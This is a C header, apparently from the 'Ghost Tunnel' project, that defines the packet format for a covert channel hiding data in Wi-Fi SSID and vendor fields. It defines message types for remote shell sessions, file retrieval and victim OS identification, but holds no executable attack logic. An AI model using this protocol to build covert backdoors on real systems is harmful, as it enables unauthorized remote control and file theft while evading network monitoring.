#ifndef _GT_COMMON_H
#define _GT_COMMON_H


#define SERVER_MAX_TUNNEL_DATA_LENGTH 32 + 255
#define WINDOWS_CLINET_MAX_TUNNEL_DATA_LENGTH 32 + 248


#define TUNNEL_CON 		0x10
#define TUNNEL_SHELL 	0x20
#define TUNNEL_FILE		0x30



#define DATA_IN_VENDOR 0x80


typedef enum _TUNNEL_DATA_TYPE
{
	TUNNEL_CON_CLIENT_REQ = 0x11,      //
	TUNNEL_CON_SERVER_RES,
	TUNNEL_CON_HEARTBEAT,

	TUNNEL_SHELL_INIT = 0x21,
	TUNNEL_SHELL_ACP,
	TUNNEL_SHELL_DATA,
	TUNNEL_SHELL_QUIT,

	TUNNEL_FILE_GET = 0x31,
	TUNNEL_FILE_INFO,
	TUNNEL_FILE_DATA,
	TUNNEL_FILE_END,
	TUNNEL_FILE_ERROR,

}TUNNEL_DATA_TYPE;


typedef enum _session_state
{
	SESSION_UNESTABLISHED = 0x01,
	SESSION_STARTING,
	SESSION_ESTABLISHED_,

}session_state;

#pragma pack(1)

typedef struct _tunnel_data_header
{
	unsigned char flag;
	unsigned char data_type;
	unsigned char seq;
	unsigned char client_id;
	unsigned char server_id;
	unsigned char length;

}tunnel_data_header;

/*
ssid[0] = 0xFE         //flag of ghost tunnel
ssid[1] = data type    //   type, data only in ssid;    type | DATA_IN_VENDOR,  data also in vendor 
ssid[2] = seq          // sequence number, avoid duplication of data 
ssid[3] = client_id    // 0x00-0xFE, 0xFF is broadcast to all clinet
ssid[4] = server_id    // server's identity
ssid[5] = length       // only about ssid filed 

*/

//ssid  32
//vendor   248


typedef struct _information_element
{
	unsigned char id;
	unsigned char length;
}information_element;

#define UNKNOW_OS 0
#define WIN_XP 1
#define	WIN_VISTA 2
#define	WIN_7 3
#define	WIN_8 4
#define	WIN_81 5
#define	WIN_10 6
#define	MAC_OSX 7

typedef struct _tunnel_online_info
{
	char os;
	char device_name[1];
}tunnel_online_info;


#pragma pack()









#endif